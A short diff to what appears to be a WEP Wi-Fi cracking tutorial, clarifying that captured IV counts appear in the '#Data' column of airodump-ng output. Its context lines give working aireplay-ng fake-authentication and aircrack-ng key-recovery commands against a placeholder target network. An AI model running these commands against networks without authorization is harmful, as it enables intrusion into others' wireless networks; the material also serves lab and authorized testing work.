@@ -40,7 +40,7 @@ sudo aireplay-ng -1 0 -e [NETWORK_NAME] -a [TARGET_BSSID] -h [YOUR_MAC] wlan0mon
 Once you have 20,000-40,000 IVs packets:
 
 ### Command 1: Cryptanalysis Attack
-If you have enough IVs (20,000-40,000+), it will find the key regardless of what the key is
+If you have enough IVs (20,000-40,000+) in `#Data` column of airodump-ng output, it will find the key regardless of what the key is
 ```
 sudo aircrack-ng -b [TARGET_BSSID] wep_capture-01.cap
 ```
